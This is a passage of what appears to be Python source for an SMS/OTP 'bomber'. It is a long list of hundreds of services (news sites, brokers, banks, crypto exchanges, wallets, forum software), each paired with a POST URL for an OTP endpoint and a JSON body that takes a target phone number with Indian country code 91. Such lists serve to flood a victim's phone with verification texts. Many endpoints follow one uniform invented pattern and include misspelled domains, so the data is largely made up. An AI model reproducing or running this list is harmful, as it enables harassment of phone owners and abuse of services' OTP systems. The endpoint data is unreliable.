    ("Nickelodeon","POST","https://api.nickelodeon.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cartoon Network","POST","https://api.cartoonnetwork.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pogo","POST","https://api.pogo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Discovery","POST","https://api.discovery.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("National Geographic","POST","https://api.nationalgeographic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BBC","POST","https://api.bbc.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CNN","POST","https://api.cnn.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fox News","POST","https://api.foxnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MSNBC","POST","https://api.msnbc.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ABC News","POST","https://api.abcnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CBS News","POST","https://api.cbsnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NBC News","POST","https://api.nbcnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CNN International","POST","https://api.cnninternational.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BBC World News","POST","https://api.bbcworldnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reuters","POST","https://api.reuters.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bloomberg","POST","https://api.bloomberg.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Financial Times","POST","https://api.ft.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WSJ","POST","https://api.wsj.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NYT","POST","https://api.nytimes.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Washington Post","POST","https://api.washingtonpost.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Guardian","POST","https://api.theguardian.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Telegraph","POST","https://api.telegraph.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Times of India","POST","https://api.timesofindia.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hindustan Times","POST","https://api.hindustantimes.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Indian Express","POST","https://api.indianexpress.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("The Hindu","POST","https://api.thehindu.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Deccan Herald","POST","https://api.deccanherald.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Business Standard","POST","https://api.businessstandard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Financial Express","POST","https://api.financialexpress.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mint","POST","https://api.mint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Economic Times","POST","https://api.economictimes.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NDTV","POST","https://api.ndtv.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ABP News","POST","https://api.abpnews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zee News","POST","https://api.zeenews.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("India Today","POST","https://api.indiatoday.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Outlook India","POST","https://api.outlookindia.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Frontline","POST","https://api.frontline.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Caravan","POST","https://api.caravan.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Scroll","POST","https://api.scroll.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("The Wire","POST","https://api.thewire.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("The Print","POST","https://api.theprint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("News18","POST","https://api.news18.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TV9","POST","https://api.tv9.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Republic TV","POST","https://api.republictv.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Times Now","POST","https://api.timesnow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CNN News18","POST","https://api.cnnnews18.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IndiaTV","POST","https://api.indiatv.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Aaj Tak","POST","https://api.aajtak.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zee Business","POST","https://api.zeebusiness.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ET Now","POST","https://api.etnow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bloomberg Quint","POST","https://api.bloombergquint.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Moneycontrol","POST","https://api.moneycontrol.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Investopedia","POST","https://api.investopedia.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TradingView","POST","https://api.tradingview.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zerodha","POST","https://api.zerodha.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Upstox","POST","https://api.upstox.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Groww","POST","https://api.groww.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Angel One","POST","https://api.angelone.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("5Paisa","POST","https://api.5paisa.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Motilal Oswal","POST","https://api.motilaloswal.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ICICI Direct","POST","https://api.icicidirect.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HDFC Securities","POST","https://api.hdfcsec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kotak Securities","POST","https://api.kotaksec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sharekhan","POST","https://api.sharekhan.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Edelweiss","POST","https://api.edelweiss.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SBI Securities","POST","https://api.sbisec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Axis Direct","POST","https://api.axisdirect.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IIFL","POST","https://api.iifl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Reliance Securities","POST","https://api.relianceSecurities.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Indiabulls Securities","POST","https://api.indiabulllssec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Geojit","POST","https://api.geojit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IDFC First Securities","POST","https://api.idfcfirstsec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yes Securities","POST","https://api.yessecurities.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Federal Bank Securities","POST","https://api.federalbanksec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("DBS Treasures","POST","https://api.dbstreasuries.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HSBC Securities","POST","https://api.hsbcsec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Citibank Securities","POST","https://api.citibanksec.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Standard Chartered","POST","https://api.sc.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Deutsche Bank","POST","https://api.deutschebank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Barclays","POST","https://api.barclays.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("UBS","POST","https://api.ubs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Credit Suisse","POST","https://api.creditsuisse.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Morgan Stanley","POST","https://api.morganstanley.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Goldman Sachs","POST","https://api.goldmansachs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("JP Morgan","POST","https://api.jpmorgan.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BlackRock","POST","https://api.blackrock.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vanguard","POST","https://api.vanguard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fidelity","POST","https://api.fidelity.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Schwab","POST","https://api.schwab.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("E*Trade","POST","https://api.etrade.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Robinhood","POST","https://api.robinhood.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Webull","POST","https://api.webull.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("M1 Finance","POST","https://api.m1finance.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SoFi","POST","https://api.sofi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Acorns","POST","https://api.acorns.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Betterment","POST","https://api.betterment.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Wealthfront","POST","https://api.wealthfront.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Stash","POST","https://api.stash.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Public","POST","https://api.public.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Crypto.com","POST","https://api.crypto.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Binance","POST","https://api.binance.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Coinbase","POST","https://api.coinbase.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kraken","POST","https://api.kraken.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gemini","POST","https://api.gemini.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("KuCoin","POST","https://api.kucoin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bitfinex","POST","https://api.bitfinex.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Huobi","POST","https://api.huobi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OKX","POST","https://api.okx.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bybit","POST","https://api.bybit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gate.io","POST","https://api.gate.io/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bittrex","POST","https://api.bittrex.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bitstamp","POST","https://api.bitstamp.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BlockFi","POST","https://api.blockfi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Nexo","POST","https://api.nexo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Celsius","POST","https://api.celsius.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ledger","POST","https://api.ledger.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Trezor","POST","https://api.trezor.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MetaMask","POST","https://api.metamask.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Trust Wallet","POST","https://api.trustwallet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Coinbase Wallet","POST","https://api.coinbasewallet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Exodus","POST","https://api.exodus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Atomic Wallet","POST","https://api.atomicwallet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Jaxx","POST","https://api.jaxx.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Guarda","POST","https://api.guarda.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Coinomi","POST","https://api.coinomi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Electrum","POST","https://api.electrum.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mycelium","POST","https://api.mycelium.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BitPay","POST","https://api.bitpay.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CoinPayments","POST","https://api.coinpayments.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NOWPayments","POST","https://api.nowpayments.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CoinGate","POST","https://api.coingate.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Blockchain","POST","https://api.blockchain.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Paxful","POST","https://api.paxful.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("LocalBitcoins","POST","https://api.localbitcoins.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hodl Hodl","POST","https://api.hodlhodl.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Bisq","POST","https://api.bisq.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Uniswap","POST","https://api.uniswap.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PancakeSwap","POST","https://api.pancakeswap.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SushiSwap","POST","https://api.sushi.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Curve Finance","POST","https://api.curve.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Aave","POST","https://api.aave.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Compound Finance","POST","https://api.compound.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Yearn Finance","POST","https://api.yearn.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Balancer","POST","https://api.balancer.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MakerDAO","POST","https://api.makerdao.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lido Finance","POST","https://api.lido.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Rocket Pool","POST","https://api.rocketpool.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Stader Labs","POST","https://api.staderlabs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ankr","POST","https://api.ankr.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Infura","POST","https://api.infura.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Alchemy","POST","https://api.alchemy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Moralis","POST","https://api.moralis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ThirdWeb","POST","https://api.thirdweb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Web3Auth","POST","https://api.web3auth.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Torus","POST","https://api.torus.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Magic","POST","https://api.magic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Privy","POST","https://api.privy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WalletConnect","POST","https://api.walletconnect.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EIP 4361","POST","https://api.eip4361.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ENS","POST","https://api.ens.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IPFS","POST","https://api.ipfs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Filecoin","POST","https://api.filecoin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Arweave","POST","https://api.arweave.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Storj","POST","https://api.storj.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sia","POST","https://api.sia.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Golem","POST","https://api.golem.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Render Network","POST","https://api.render.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Livepeer","POST","https://api.livepeer.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Theta Network","POST","https://api.theta.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("VeChain","POST","https://api.vechain.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IOTA","POST","https://api.iota.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Hedera","POST","https://api.hedera.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Algorand","POST","https://api.algorand.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Avalanche","POST","https://api.avalanche.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Solana","POST","https://api.solana.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Polygon","POST","https://api.polygon.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cardano","POST","https://api.cardano.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Polkadot","POST","https://api.polkadot.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kusama","POST","https://api.kusama.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Near Protocol","POST","https://api.near.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cosmos","POST","https://api.cosmos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Tezos","POST","https://api.tezos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EOS","POST","https://api.eos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TRON","POST","https://api.tron.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NEO","POST","https://api.neo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NEM","POST","https://api.nem.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IOST","POST","https://api.iost.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zilliqa","POST","https://api.zilliqa.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ontology","POST","https://api.ontology.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Waves","POST","https://api.waves.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Elrond","POST","https://api.elrond.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Harmony","POST","https://api.harmony.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Celo","POST","https://api.celo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flow","POST","https://api.flow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Aptos","POST","https://api.aptos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sui","POST","https://api.sui.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Sei","POST","https://api.sei.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Injective","POST","https://api.injective.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Osmosis","POST","https://api.osmosis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Juno","POST","https://api.juno.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Evmos","POST","https://api.evmos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cronos","POST","https://api.cronos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fantom","POST","https://api.fantom.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Moonbeam","POST","https://api.moonbeam.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Moonriver","POST","https://api.moonriver.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Astar","POST","https://api.astar.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Shiden","POST","https://api.shiden.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kava","POST","https://api.kava.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Band Protocol","POST","https://api.bandprotocol.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Chainlink","POST","https://api.chainlink.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("API3","POST","https://api.api3.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Theta Fuel","POST","https://api.thetafuel.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IoTeX","POST","https://api.iotex.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Helium","POST","https://api.helium.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Filebase","POST","https://api.filebase.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Spheron","POST","https://api.spheron.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Akash","POST","https://api.akash.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cudos","POST","https://api.cudos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fetch AI","POST","https://api.fetch.ai/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SingularityNET","POST","https://api.singularitynet.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ocean Protocol","POST","https://api.oceanprotocol.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Covalent","POST","https://api.covalent.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TheGraph","POST","https://api.thegraph.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Subgraph","POST","https://api.subgraph.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ceramic","POST","https://api.ceramic.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Textile","POST","https://api.textile.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("OrbitDB","POST","https://api.orbitdb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Pinata","POST","https://api.pinata.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NFT Storage","POST","https://api.nft.storage/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Web3 Storage","POST","https://api.web3.storage/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Estuary","POST","https://api.estuary.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Fleek","POST","https://api.fleek.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ceramic Network","POST","https://api.ceramicnetwork.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("3Box","POST","https://api.3box.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Spruce","POST","https://api.spruce.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IDX","POST","https://api.idx.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Orbis","POST","https://api.orbis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Crossbell","POST","https://api.crossbell.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Lens Protocol","POST","https://api.lensprotocol.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Farcaster","POST","https://api.farcaster.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Orbit","POST","https://api.orbit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("DeSo","POST","https://api.deso.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Minds","POST","https://api.minds.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Gun","POST","https://api.gun.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SecureScuttlebutt","POST","https://api.scuttlebutt.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Matrix","POST","https://api.matrix.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RocketChat","POST","https://api.rocketchat.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zulip","POST","https://api.zulip.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mattermost","POST","https://api.mattermost.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Discourse","POST","https://api.discourse.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Flarum","POST","https://api.flarum.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Vanilla","POST","https://api.vanilla.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Xenforo","POST","https://api.xenforo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PhpBB","POST","https://api.phpbb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MyBB","POST","https://api.mybb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SimpleMachines","POST","https://api.simplemachines.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PunBB","POST","https://api.punbb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("vBulletin","POST","https://api.vbulletin.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IPBoard","POST","https://api.ipboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WoltLab","POST","https://api.woltlab.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BurningBoard","POST","https://api.burningboard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NodeBB","POST","https://api.nodebb.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Ghost Blog","POST","https://api.ghostblog.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("WriteFreely","POST","https://api.writefreely.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Plume","POST","https://api.plume.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
